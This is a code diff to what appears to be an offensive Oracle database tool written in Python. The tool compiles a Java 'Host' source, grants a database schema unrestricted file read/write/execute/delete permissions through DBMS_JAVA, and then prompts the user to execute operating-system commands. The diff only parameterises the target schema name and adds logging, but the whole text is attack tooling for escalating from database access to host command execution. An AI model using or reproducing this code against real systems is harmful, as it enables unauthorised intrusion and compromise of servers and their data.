@@ -57,7 +57,7 @@ def JAVA_JIT(cur):
 	except Exception as e:
 		error(e)
 
-def CreatePLSQL(cur):
+def CreatePLSQL(cur,usr):
 	query1 = """
 		CREATE OR REPLACE AND COMPILE 
 		JAVA SOURCE NAMED "Host" 
@@ -153,13 +153,13 @@ def CreatePLSQL(cur):
 
 	query3 = """
 		DECLARE
-		  l_schema VARCHAR2(30) := 'TEST';
+		  l_schema VARCHAR2(30) := '%s';
 		BEGIN
 		  DBMS_JAVA.grant_permission(l_schema, 'java.io.FilePermission', '<<ALL FILES>>', 'read ,write, execute, delete');
 		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'writeFileDescriptor', '');
 		  DBMS_JAVA.grant_permission(l_schema, 'SYS:java.lang.RuntimePermission', 'readFileDescriptor', '');
 		END;
-	"""
+	"""%user
 
 	try:
 		cur.execute(query1)
@@ -168,15 +168,17 @@ def CreatePLSQL(cur):
 		normal("Procedure Created")
 		try:
 			cur.execute(query3)
-			normal("Permission Granted")
-		except:
+			normal("\"%s\" Permission Granted"%user)
+		except Exception as e:
+			warning("\"%s\" Permission NOT Granted"%user)
+			warning(e)
 			pass
 		cur.callproc("dbms_output.enable", (1024,))
 		cur.callproc("dbms_java.set_output",(100000,))
 		normal("Enable OutPut")
 		normal("PL/SQL Procedure successfully completed")
 		#normal("Grant Successfully")
-		print("="*32)
+		print("="*64)
 		return cur
 	except Exception as e:
 		error(e)
@@ -272,7 +274,7 @@ platform = getPlatform(cur)
 signal.signal(signal.SIGINT, quit)
 signal.signal(signal.SIGTERM, quit)
 JAVA_JIT(cur)
-CreatePLSQL(cur)
+CreatePLSQL(cur,user)
 executeresult("Execute Command:")
 #Different Platform
 if platform == "Linux":
